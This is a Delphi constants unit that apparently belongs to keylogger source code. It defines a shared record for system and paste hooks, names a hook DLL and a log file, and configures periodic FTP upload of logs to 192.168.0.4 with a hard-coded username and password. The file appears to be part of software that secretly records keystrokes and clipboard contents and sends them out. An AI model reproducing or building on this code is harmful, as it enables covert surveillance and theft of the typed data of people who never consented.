unit KLConst;

interface

uses
  Winapi.Windows;

type
  PGlobalDLLData = ^TGlobalDLLData;
  TGlobalDLLData = packed record
    SysHook: HHOOK;
    PasteHook: HHOOK;
    MyAppWnd: HWND;
  end;

const
  KL_MMF_NAME = 'KLMMF';

  KL_LOG_NAME = 'KLLog';
  KL_DLL_NAME = 'KLHookLib.dll';

  FTP_HOST = '192.168.0.4';
  FTP_PORT = 21;
  FTP_USERNAME = 'ftp_download';
  FTP_PASSWORD = '100=100hfdyj200';

  FTP_DIR_NAME = 'KL';
  FTP_UPLOAD_INTERVAL_MIN = 60;

implementation

end.
